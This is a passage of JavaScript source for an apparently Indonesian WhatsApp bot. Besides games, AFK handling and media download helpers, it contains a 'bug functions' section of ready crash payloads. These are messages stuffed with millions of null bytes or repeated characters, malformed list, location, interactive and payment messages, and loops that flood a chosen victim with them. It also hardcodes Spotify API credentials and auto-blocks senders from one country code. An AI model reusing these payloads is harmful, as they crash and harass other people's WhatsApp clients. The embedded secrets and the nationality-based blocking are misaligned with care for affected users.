    		stock:10,
    		autobio: false,
    		autoclearsession: false,
    		auto_ai_grup: true,
    		goodbye: true,
        onlygrub: false,
        onlypc: false,
        welcome: true, 
    		autoread: true
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !isOwner) return
}


if (!mikupoxy.public) {
if (!m.key.fromMe) return
}

// TOURL NEW
async function uploadToCatbox(filePath) {
            const form = new FormData();
            form.append('fileToUpload', fs.createReadStream(filePath)); // file yang diupload
            form.append('reqtype', 'fileupload'); // reqtype harus "fileupload"
          
            try {
              const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                  ...form.getHeaders(),
                },
              });
          
              if (response.data) {
                // Ambil hanya nama file yang diunggah
                const filename = response.data.trim();
                return `${filename}`;
              } else {
                throw new Error('Gagal mendapatkan URL dari Catbox.');
              }
            } catch (error) {
              console.error('Error uploading to Catbox:', error.message);
              throw error;
            }
          }

//=========================================\\
//=========================================\\
//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
dansyaverifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
}

mikupoxy.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengaku kalah`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await mikupoxy.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await mikupoxy.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    mikupoxy.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    mikupoxy.sendText(m.chat, `Jas telah dikirim ke obrolan

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing-masing"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) mikupoxy.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) mikupoxy.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) mikupoxy.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nSuit Dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    mikupoxy.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Gunting/i
	    let b = /Batu/i
	    let k = /Kertas/i
	    let reg = /^(Gunting|Batu|Kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih2) mikupoxy.sendText(roof.p2, '_Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih) mikupoxy.sendText(roof.p, '_ Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    mikupoxy.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	async function updateBio() {
    try {
        const data = await fetchApiData();
        if (data) {
            // Menggunakan jumlah pemain online dari "gtyn" sebagai status bio
            await mikupoxy.updateProfileStatus(`GTYN Players Online: ${data['online']}`);
        } else {
            console.error('Failed to fetch data.');
        }
    } catch (error) {
        console.error('Error updating bio:', error);
    }
}

// Memastikan autobio diaktifkan dan kemudian memulai interval untuk memperbarui bio setiap 3 detik (3000 milidetik)
if (db.settings[botNumber].autobio) {
    // Interval untuk memperbarui bio setiap 3 detik
    setInterval(updateBio, 200000); // 3000 ms = 3 detik
    // Memperbarui bio segera saat bot dinyalakan
    updateBio();
}

async function clearSession() {
    try {
        const files = await fs.promises.readdir("./sessions");
        let filteredArray = files.filter(item => 
            item.startsWith("pre-key") ||
            item.startsWith("sender-key") || 
            item.startsWith("session-") || 
            item.startsWith("app-state")
        );        
        if (filteredArray.length === 0) return

        filteredArray.forEach((e, i) => {
            teks += `${i + 1}. ${e}\n`;
        });
        
        await sleep(600000);        
        await Promise.all(filteredArray.map(async (file) => {
            await fs.promises.unlink(`./sessions/${file}`);
        }));   
    } catch (error) {
        //console.error('Error clearing session:', error);
    }
}

if (db.settings[botNumber].autoclearsession) {
    setInterval(clearSession, 600000); // 200000 ms = 600 detik
    clearSession();
}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return mikupoxy.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By Kinchan`,
inviteExpiration: Date.now() + 1814400000
}
}}

//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await mikupoxy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

async function sendmikupoxyMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await mikupoxy.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const poxreply = (teks) => {
mikupoxy.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.botname}`,
"body": `${mikupoxyliatwaktu} ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://i.ibb.co.com/MBqhQmz/IMG-20241013-071711.jpg',
"sourceUrl": 'https://instagram.com/inziexyz'}}},
{ quoted: fkontak})
}

const reply = (teks) => {
mikupoxy.sendMessage(from, { text: teks }, { quoted : m})
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./data/image/thumb.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./data/image/thumb.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🐦드림 가이 mikupoxy`
}
}
}
async function mikupoxyainew(text) {
try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?promt=kamu adalah Inzie Hosting, yang memiliki sifat baik dan sopan, kamu memiliki chanel YouTube bernama Inzie Official&text=${encodeURIComponent(text)}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await mikupoxy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await mikupoxy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🐦드림 가이 mikupoxy",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: mikupoxy.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🐦드림 가이 mikupoxy"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await mikupoxy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await mikupoxy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🐦드림 가이 mikupoxy"+" ".repeat(1000000),
        'footerText': `🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy`,
        'description': `🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy 🐦드림 가이 mikupoxy`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await mikupoxy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
const sendReaction = async reactionContent => {
  mikupoxy.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   mikupoxy.sendMessage(recipientJid, {
      'text': ''.repeat(1000000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(1000000)
            })
          })
        }
      }
    }, {});
    mikupoxy.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(9000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await mikupoxy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(1000000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 900000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await mikupoxy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(900000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await mikupoxy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  mikupoxy.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(900000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  mikupoxy.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 864100000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessagesdansya(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessagesdansya(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return mikupoxy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return mikupoxy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
mikupoxy.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await mikupoxy.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
mikupoxy.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
